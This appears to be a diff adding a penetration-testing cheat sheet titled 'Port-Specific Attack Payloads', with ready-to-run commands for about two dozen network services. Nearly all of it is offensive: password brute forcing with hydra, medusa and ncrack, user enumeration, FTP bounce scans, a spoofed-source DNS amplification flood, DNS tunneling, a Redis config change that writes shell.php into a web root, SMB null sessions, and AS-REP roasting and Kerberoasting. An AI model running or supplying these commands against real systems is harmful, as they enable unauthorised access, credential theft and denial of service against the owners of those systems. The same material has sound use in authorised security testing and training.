@@ -1,0 +1,416 @@
+# Port-Specific Attack Payloads
+
+## FTP - Port 21
+
+### FTP Reconnaissance
+nmap -p 21 -sV --script=ftp-* 192.168.1.100                            # All FTP scripts
+nmap -p 21 --script=ftp-anon 192.168.1.100                             # Anonymous login check
+nmap -p 21 --script=ftp-bounce 192.168.1.100                           # FTP bounce attack
+nc -v 192.168.1.100 21                                                 # Banner grabbing
+telnet 192.168.1.100 21                                                # Interactive banner
+
+### FTP Brute Force
+hydra -L users.txt -P passwords.txt ftp://192.168.1.100                # Hydra brute force
+hydra -l admin -P passwords.txt ftp://192.168.1.100 -t 4               # Single user
+medusa -h 192.168.1.100 -u admin -P passwords.txt -M ftp               # Medusa
+ncrack -p 21 --user admin -P passwords.txt 192.168.1.100               # Ncrack
+patator ftp_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt
+
+### FTP Anonymous Access
+ftp 192.168.1.100
+# Username: anonymous
+# Password: anonymous@domain.com
+
+### FTP Bounce Attack
+nmap -b anonymous:password@192.168.1.100 -p 80 192.168.1.50            # Port scan via FTP
+nmap -b ftp.target.com:21 -p 1-1024 192.168.1.50                       # Bounce scan
+
+### FTP Commands
+ftp 192.168.1.100
+USER username
+PASS password
+LIST                                                                    # List files
+RETR file.txt                                                          # Download file
+STOR file.txt                                                          # Upload file
+PASV                                                                    # Passive mode
+PORT 192,168,1,50,4,1                                                  # Active mode
+
+## SSH - Port 22
+
+### SSH Reconnaissance
+nmap -p 22 -sV --script=ssh-* 192.168.1.100                            # All SSH scripts
+nmap -p 22 --script=ssh-auth-methods 192.168.1.100                     # Auth methods
+nmap -p 22 --script=ssh-hostkey 192.168.1.100                          # Host keys
+nc -v 192.168.1.100 22                                                 # Banner grab
+
+### SSH Brute Force
+hydra -L users.txt -P passwords.txt ssh://192.168.1.100                # Hydra
+hydra -l root -P passwords.txt ssh://192.168.1.100 -t 4                # Single user
+medusa -h 192.168.1.100 -u root -P passwords.txt -M ssh                # Medusa
+ncrack -p 22 --user root -P passwords.txt 192.168.1.100                # Ncrack
+patator ssh_login host=192.168.1.100 user=root password=FILE0 0=passwords.txt
+metasploit: use auxiliary/scanner/ssh/ssh_login                        # MSF module
+
+### SSH User Enumeration
+nmap -p 22 --script=ssh-auth-methods --script-args="ssh.user=root" 192.168.1.100
+python3 ssh-user-enum.py --port 22 --userList users.txt 192.168.1.100
+
+### SSH Key Attacks
+ssh-keygen -t rsa -b 4096                                              # Generate key pair
+ssh-copy-id user@192.168.1.100                                         # Copy public key
+ssh -i id_rsa user@192.168.1.100                                       # Connect with key
+john --wordlist=passwords.txt id_rsa.hash                              # Crack private key
+python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash                # Convert to hash
+
+### SSH Tunneling
+ssh -L 8080:localhost:80 user@192.168.1.100                            # Local port forward
+ssh -R 8080:localhost:80 user@192.168.1.100                            # Remote port forward
+ssh -D 1080 user@192.168.1.100                                         # Dynamic SOCKS proxy
+ssh -N -f -L 3306:localhost:3306 user@192.168.1.100                    # Background tunnel
+
+## SMTP - Port 25
+
+### SMTP Reconnaissance
+nmap -p 25 -sV --script=smtp-* 192.168.1.100                           # All SMTP scripts
+nmap -p 25 --script=smtp-commands 192.168.1.100                        # SMTP commands
+nmap -p 25 --script=smtp-enum-users 192.168.1.100                      # User enumeration
+nmap -p 25 --script=smtp-open-relay 192.168.1.100                      # Open relay check
+nc -v 192.168.1.100 25                                                 # Banner grab
+
+### SMTP User Enumeration
+smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100                   # VRFY method
+smtp-user-enum -M EXPN -U users.txt -t 192.168.1.100                   # EXPN method
+smtp-user-enum -M RCPT -U users.txt -t 192.168.1.100                   # RCPT method
+
+### SMTP Commands
+telnet 192.168.1.100 25
+HELO attacker.com
+MAIL FROM: <attacker@evil.com>
+RCPT TO: <victim@target.com>
+DATA
+Subject: Test
+This is a test email
+.
+QUIT
+
+### SMTP Relay Testing
+nmap -p 25 --script=smtp-open-relay 192.168.1.100                      # Check relay
+telnet 192.168.1.100 25
+# Try sending email to external domain
+
+### SMTP Brute Force
+hydra -L users.txt -P passwords.txt smtp://192.168.1.100               # Hydra
+hydra -l admin@target.com -P passwords.txt smtp://192.168.1.100:587    # Port 587
+
+## DNS - Port 53
+
+### DNS Reconnaissance
+nmap -p 53 -sU -sV --script=dns-* 192.168.1.100                        # All DNS scripts
+nmap -p 53 --script=dns-zone-transfer 192.168.1.100                    # Zone transfer
+dig @192.168.1.100 target.com ANY                                      # All records
+dig @192.168.1.100 target.com axfr                                     # Zone transfer
+host -l target.com 192.168.1.100                                       # Zone transfer
+
+### DNS Enumeration
+fierce --domain target.com --dns-servers 192.168.1.100                 # Fierce
+dnsrecon -d target.com -n 192.168.1.100                                # DNSRecon
+dnsenum --dnsserver 192.168.1.100 target.com                           # DNSenum
+
+### DNS Amplification
+hping3 --udp -p 53 --flood --rand-source -d 512 192.168.1.100          # Amplification DoS
+dig @192.168.1.100 isc.org ANY +edns=0 +bufsize=4096                   # Large response
+
+### DNS Tunneling
+iodine -f -P password 192.168.1.100 tunnel.target.com                  # Iodine client
+dnscat2 tunnel.target.com --dns server=192.168.1.100                   # Dnscat2
+
+## HTTP - Port 80
+
+### HTTP Reconnaissance
+nmap -p 80 -sV --script=http-* 192.168.1.100                           # All HTTP scripts
+nmap -p 80 --script=http-enum 192.168.1.100                            # Directory enum
+nmap -p 80 --script=http-headers 192.168.1.100                         # HTTP headers
+nmap -p 80 --script=http-methods 192.168.1.100                         # HTTP methods
+curl -I http://192.168.1.100                                           # Headers only
+curl -v http://192.168.1.100                                           # Verbose
+
+### Directory Brute Force
+gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt
+dirb http://192.168.1.100 /usr/share/wordlists/dirb/common.txt         # Dirb
+ffuf -w wordlist.txt -u http://192.168.1.100/FUZZ                      # FFUF
+wfuzz -w wordlist.txt http://192.168.1.100/FUZZ                        # Wfuzz
+dirsearch -u http://192.168.1.100 -e php,html,js                       # Dirsearch
+
+### HTTP Methods Testing
+nmap -p 80 --script=http-methods --script-args http-methods.url-path='/test' 192.168.1.100
+curl -X OPTIONS http://192.168.1.100 -i                                # OPTIONS method
+curl -X PUT -d "test" http://192.168.1.100/test.txt                    # PUT upload
+curl -X DELETE http://192.168.1.100/test.txt                           # DELETE
+
+### HTTP Authentication Brute Force
+hydra -L users.txt -P passwords.txt http-get://192.168.1.100           # Basic auth
+hydra -L users.txt -P passwords.txt http-post-form://192.168.1.100/login.php:"user=^USER^&pass=^PASS^:F=incorrect"
+
+## HTTPS - Port 443
+
+### HTTPS Reconnaissance
+nmap -p 443 -sV --script=ssl-* 192.168.1.100                           # All SSL scripts
+nmap -p 443 --script=ssl-cert 192.168.1.100                            # Certificate info
+nmap -p 443 --script=ssl-enum-ciphers 192.168.1.100                    # Cipher suites
+openssl s_client -connect 192.168.1.100:443                            # SSL connection
+sslscan 192.168.1.100:443                                              # SSL scanner
+testssl.sh 192.168.1.100:443                                           # Comprehensive test
+
+### SSL/TLS Vulnerabilities
+nmap -p 443 --script=ssl-heartbleed 192.168.1.100                      # Heartbleed
+nmap -p 443 --script=ssl-poodle 192.168.1.100                          # POODLE
+nmap -p 443 --script=ssl-ccs-injection 192.168.1.100                   # CCS injection
+nmap -p 443 --script=ssl-dh-params 192.168.1.100                       # Weak DH params
+
+### Certificate Analysis
+openssl s_client -connect 192.168.1.100:443 -showcerts                 # Show certificates
+echo | openssl s_client -connect 192.168.1.100:443 2>/dev/null | openssl x509 -noout -dates
+echo | openssl s_client -connect 192.168.1.100:443 2>/dev/null | openssl x509 -noout -subject
+
+## POP3 - Port 110
+
+### POP3 Reconnaissance
+nmap -p 110 -sV --script=pop3-* 192.168.1.100                          # All POP3 scripts
+nc -v 192.168.1.100 110                                                # Banner grab
+telnet 192.168.1.100 110                                               # Interactive
+
+### POP3 Brute Force
+hydra -L users.txt -P passwords.txt pop3://192.168.1.100               # Hydra
+medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M pop3          # Medusa
+
+### POP3 Commands
+USER username
+PASS password
+LIST                                                                    # List messages
+RETR 1                                                                  # Retrieve message 1
+QUIT
+
+## IMAP - Port 143
+
+### IMAP Reconnaissance
+nmap -p 143 -sV --script=imap-* 192.168.1.100                          # All IMAP scripts
+nc -v 192.168.1.100 143                                                # Banner grab
+
+### IMAP Brute Force
+hydra -L users.txt -P passwords.txt imap://192.168.1.100               # Hydra
+nmap -p 143 --script=imap-brute 192.168.1.100                          # Nmap brute
+
+## SMB - Ports 139, 445
+
+### SMB Reconnaissance
+nmap -p 139,445 -sV --script=smb-* 192.168.1.100                       # All SMB scripts
+nmap -p 445 --script=smb-os-discovery 192.168.1.100                    # OS discovery
+nmap -p 445 --script=smb-enum-shares 192.168.1.100                     # Share enumeration
+nmap -p 445 --script=smb-enum-users 192.168.1.100                      # User enumeration
+enum4linux -a 192.168.1.100                                            # Comprehensive enum
+smbclient -L //192.168.1.100 -N                                        # List shares (null session)
+smbmap -H 192.168.1.100                                                # SMB share mapper
+crackmapexec smb 192.168.1.100                                         # CrackMapExec
+
+### SMB Vulnerabilities
+nmap -p 445 --script=smb-vuln-* 192.168.1.100                          # All SMB vulns
+nmap -p 445 --script=smb-vuln-ms17-010 192.168.1.100                   # EternalBlue
+nmap -p 445 --script=smb-vuln-ms08-067 192.168.1.100                   # MS08-067
+
+### SMB Brute Force
+hydra -L users.txt -P passwords.txt smb://192.168.1.100                # Hydra
+crackmapexec smb 192.168.1.100 -u users.txt -p passwords.txt           # CrackMapExec
+medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M smbnt         # Medusa
+
+### SMB Access
+smbclient //192.168.1.100/share -U username                            # Connect to share
+smbclient //192.168.1.100/IPC$ -N                                      # Null session
+mount -t cifs //192.168.1.100/share /mnt/smb -o username=user          # Mount share
+
+## MSSQL - Port 1433
+
+### MSSQL Reconnaissance
+nmap -p 1433 -sV --script=ms-sql-* 192.168.1.100                       # All MSSQL scripts
+nmap -p 1433 --script=ms-sql-info 192.168.1.100                        # Server info
+nmap -p 1433 --script=ms-sql-empty-password 192.168.1.100              # Empty password
+
+### MSSQL Brute Force
+hydra -L users.txt -P passwords.txt mssql://192.168.1.100              # Hydra
+nmap -p 1433 --script=ms-sql-brute 192.168.1.100                       # Nmap brute
+medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M mssql         # Medusa
+
+### MSSQL Commands
+sqsh -S 192.168.1.100 -U sa -P password                                # Connect
+mssqlclient.py user:password@192.168.1.100                             # Impacket
+
+## MySQL - Port 3306
+
+### MySQL Reconnaissance
+nmap -p 3306 -sV --script=mysql-* 192.168.1.100                        # All MySQL scripts
+nmap -p 3306 --script=mysql-info 192.168.1.100                         # Server info
+nmap -p 3306 --script=mysql-empty-password 192.168.1.100               # Empty password
+
+### MySQL Brute Force
+hydra -L users.txt -P passwords.txt mysql://192.168.1.100              # Hydra
+nmap -p 3306 --script=mysql-brute 192.168.1.100                        # Nmap brute
+medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M mysql         # Medusa
+
+### MySQL Connection
+mysql -h 192.168.1.100 -u root -p                                      # Connect
+mysql -h 192.168.1.100 -u root -ppassword -e "SHOW DATABASES;"         # Execute query
+
+## RDP - Port 3389
+
+### RDP Reconnaissance
+nmap -p 3389 -sV --script=rdp-* 192.168.1.100                          # All RDP scripts
+nmap -p 3389 --script=rdp-enum-encryption 192.168.1.100                # Encryption enum
+nmap -p 3389 --script=rdp-vuln-ms12-020 192.168.1.100                  # MS12-020
+
+### RDP Brute Force
+hydra -L users.txt -P passwords.txt rdp://192.168.1.100                # Hydra
+crowbar -b rdp -s 192.168.1.100 -u admin -C passwords.txt              # Crowbar
+ncrack -p 3389 --user admin -P passwords.txt 192.168.1.100             # Ncrack
+
+### RDP Connection
+rdesktop 192.168.1.100                                                 # Connect
+xfreerdp /u:admin /p:password /v:192.168.1.100                         # FreeRDP
+
+## PostgreSQL - Port 5432
+
+### PostgreSQL Reconnaissance
+nmap -p 5432 -sV --script=pgsql-* 192.168.1.100                        # All PostgreSQL scripts
+nc -v 192.168.1.100 5432                                               # Banner grab
+
+### PostgreSQL Brute Force
+hydra -L users.txt -P passwords.txt postgres://192.168.1.100           # Hydra
+medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M postgres      # Medusa
+
+### PostgreSQL Connection
+psql -h 192.168.1.100 -U postgres                                      # Connect
+psql -h 192.168.1.100 -U postgres -c "SELECT version();"               # Execute query
+
+## VNC - Port 5900
+
+### VNC Reconnaissance
+nmap -p 5900 -sV --script=vnc-* 192.168.1.100                          # All VNC scripts
+nmap -p 5900 --script=vnc-info 192.168.1.100                           # VNC info
+
+### VNC Brute Force
+hydra -P passwords.txt vnc://192.168.1.100                             # Hydra (no username)
+medusa -h 192.168.1.100 -P passwords.txt -M vnc                        # Medusa
+nmap -p 5900 --script=vnc-brute 192.168.1.100                          # Nmap brute
+
+### VNC Connection
+vncviewer 192.168.1.100:5900                                           # Connect
+vncviewer 192.168.1.100::5900 -passwd password                         # With password
+
+## Redis - Port 6379
+
+### Redis Reconnaissance
+nmap -p 6379 -sV --script=redis-* 192.168.1.100                        # All Redis scripts
+nc -v 192.168.1.100 6379                                               # Connect
+redis-cli -h 192.168.1.100                                             # Redis CLI
+
+### Redis Exploitation
+redis-cli -h 192.168.1.100 INFO                                        # Server info
+redis-cli -h 192.168.1.100 CONFIG GET *                                # Get config
+redis-cli -h 192.168.1.100 CONFIG SET dir /var/www/html                # Change dir
+redis-cli -h 192.168.1.100 CONFIG SET dbfilename shell.php             # Set filename
+
+## MongoDB - Port 27017
+
+### MongoDB Reconnaissance
+nmap -p 27017 -sV --script=mongodb-* 192.168.1.100                     # All MongoDB scripts
+nmap -p 27017 --script=mongodb-databases 192.168.1.100                 # List databases
+
+### MongoDB Connection
+mongo 192.168.1.100:27017                                              # Connect
+mongo 192.168.1.100:27017/database                                     # Connect to DB
+mongo --host 192.168.1.100 --port 27017 -u admin -p password           # Authenticated
+
+## Telnet - Port 23
+
+### Telnet Reconnaissance
+nmap -p 23 -sV --script=telnet-* 192.168.1.100                         # All Telnet scripts
+nc -v 192.168.1.100 23                                                 # Banner grab
+
+### Telnet Brute Force
+hydra -L users.txt -P passwords.txt telnet://192.168.1.100             # Hydra
+medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M telnet        # Medusa
+nmap -p 23 --script=telnet-brute 192.168.1.100                         # Nmap brute
+
+### Telnet Connection
+telnet 192.168.1.100                                                   # Connect
+
+## SNMP - Port 161
+
+### SNMP Reconnaissance
+nmap -sU -p 161 -sV --script=snmp-* 192.168.1.100                      # All SNMP scripts
+nmap -sU -p 161 --script=snmp-brute 192.168.1.100                      # Community brute
+onesixtyone -c community.txt 192.168.1.100                             # Community brute
+snmpwalk -v 2c -c public 192.168.1.100                                 # SNMP walk
+snmpcheck -t 192.168.1.100                                             # SNMP check
+
+### SNMP Enumeration
+snmpwalk -v 2c -c public 192.168.1.100 .1.3.6.1.2.1.1                  # System info
+snmpwalk -v 2c -c public 192.168.1.100 .1.3.6.1.2.1.25.4.2.1.2         # Running processes
+snmpwalk -v 2c -c public 192.168.1.100 .1.3.6.1.2.1.25.6.3.1.2         # Installed software
+snmpwalk -v 2c -c public 192.168.1.100 .1.3.6.1.2.1.6.13.1.3           # TCP ports
+
+## LDAP - Ports 389, 636
+
+### LDAP Reconnaissance
+nmap -p 389 -sV --script=ldap-* 192.168.1.100                          # All LDAP scripts
+nmap -p 389 --script=ldap-rootdse 192.168.1.100                        # Root DSE
+nmap -p 389 --script=ldap-search 192.168.1.100                         # LDAP search
+
+### LDAP Enumeration
+ldapsearch -x -h 192.168.1.100 -s base                                 # Base search
+ldapsearch -x -h 192.168.1.100 -b "DC=domain,DC=com"                   # Domain search
+ldapsearch -x -h 192.168.1.100 -b "DC=domain,DC=com" "(objectClass=*)" # All objects
+ldapsearch -x -h 192.168.1.100 -D "cn=admin,dc=domain,dc=com" -w password # Authenticated
+
+### LDAP Brute Force
+hydra -L users.txt -P passwords.txt ldap://192.168.1.100               # Hydra
+
+## NFS - Port 2049
+
+### NFS Reconnaissance
+nmap -p 111,2049 -sV --script=nfs-* 192.168.1.100                      # All NFS scripts
+nmap -p 111 --script=rpcinfo 192.168.1.100                             # RPC info
+showmount -e 192.168.1.100                                             # Show exports
+rpcinfo -p 192.168.1.100                                               # RPC services
+
+### NFS Mounting
+mount -t nfs 192.168.1.100:/share /mnt/nfs                             # Mount share
+mount -t nfs -o nolock 192.168.1.100:/share /mnt/nfs                   # No lock mount
+
+## Rsync - Port 873
+
+### Rsync Reconnaissance
+nmap -p 873 -sV --script=rsync-* 192.168.1.100                         # All Rsync scripts
+nc -v 192.168.1.100 873                                                # Banner grab
+
+### Rsync Enumeration
+rsync rsync://192.168.1.100                                            # List modules
+rsync rsync://192.168.1.100/module/                                    # List files
+rsync -av rsync://192.168.1.100/module/ /tmp/rsync                     # Download
+
+## TFTP - Port 69
+
+### TFTP File Transfer
+nmap -sU -p 69 --script=tftp-enum 192.168.1.100                        # TFTP enum
+tftp 192.168.1.100                                                     # Connect
+# get file.txt
+# put file.txt
+
+## Kerberos - Port 88
+
+### Kerberos Reconnaissance
+nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='domain.com',userdb=users.txt 192.168.1.100
+
+### Kerberos Attacks
+# AS-REP Roasting
+GetNPUsers.py domain.com/ -usersfile users.txt -no-pass -dc-ip 192.168.1.100
+# Kerberoasting
+GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.100 -request
